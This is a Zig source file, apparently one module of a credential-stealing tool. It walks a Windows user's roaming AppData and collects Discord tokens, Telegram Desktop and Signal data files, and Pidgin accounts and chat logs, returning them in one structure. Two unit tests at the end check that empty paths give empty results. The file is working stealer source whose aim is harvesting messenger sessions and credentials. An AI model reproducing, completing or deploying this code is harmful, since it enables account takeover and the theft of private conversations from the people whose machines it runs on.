const std = @import("std");
const discord = @import("discord.zig");
const telegram = @import("telegram.zig");
const signal = @import("signal.zig");
const pidgin = @import("pidgin.zig");

pub const MessengerData = struct {
    discord_tokens: [][]const u8,
    telegram_files: [][]const u8,
    signal_files: [][]const u8,
    pidgin_accounts: [][]const u8,
    pidgin_logs: [][]const u8,
};

fn freeStrings(list: [][]const u8, allocator: std.mem.Allocator) void {
    for (list) |s| allocator.free(s);
    allocator.free(list);
}

pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8, local_app_data: []const u8) !MessengerData {
    _ = local_app_data;

    const discord_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "discord" });
    defer allocator.free(discord_path);
    const discord_tokens = discord.collect(allocator, discord_path) catch try allocator.alloc([]const u8, 0);

    const telegram_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "Telegram Desktop" });
    defer allocator.free(telegram_path);
    const telegram_files = telegram.collect(allocator, telegram_path) catch try allocator.alloc([]const u8, 0);

    const signal_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, "Signal" });
    defer allocator.free(signal_path);
    const signal_files = signal.collect(allocator, signal_path) catch try allocator.alloc([]const u8, 0);

    const pidgin_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, ".purple" });
    defer allocator.free(pidgin_path);
    const pidgin_result = pidgin.collect(allocator, pidgin_path) catch pidgin.MessengerResult{
        .accounts = try allocator.alloc([]const u8, 0),
        .log_files = try allocator.alloc([]const u8, 0),
    };

    return MessengerData{
        .discord_tokens = discord_tokens,
        .telegram_files = telegram_files,
        .signal_files = signal_files,
        .pidgin_accounts = pidgin_result.accounts,
        .pidgin_logs = pidgin_result.log_files,
    };
}

test "collect returns empty result for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__roaming", "C:\\__nonexistent__local");
    defer {
        freeStrings(result.discord_tokens, std.testing.allocator);
        freeStrings(result.telegram_files, std.testing.allocator);
        freeStrings(result.signal_files, std.testing.allocator);
        freeStrings(result.pidgin_accounts, std.testing.allocator);
        freeStrings(result.pidgin_logs, std.testing.allocator);
    }
    try std.testing.expectEqual(@as(usize, 0), result.discord_tokens.len);
    try std.testing.expectEqual(@as(usize, 0), result.telegram_files.len);
    try std.testing.expectEqual(@as(usize, 0), result.signal_files.len);
    try std.testing.expectEqual(@as(usize, 0), result.pidgin_accounts.len);
    try std.testing.expectEqual(@as(usize, 0), result.pidgin_logs.len);
}

test "MessengerData default is empty" {
    const md = MessengerData{
        .discord_tokens = &[_][]const u8{},
        .telegram_files = &[_][]const u8{},
        .signal_files = &[_][]const u8{},
        .pidgin_accounts = &[_][]const u8{},
        .pidgin_logs = &[_][]const u8{},
    };
    try std.testing.expectEqual(@as(usize, 0), md.discord_tokens.len);
    try std.testing.expectEqual(@as(usize, 0), md.pidgin_accounts.len);
}
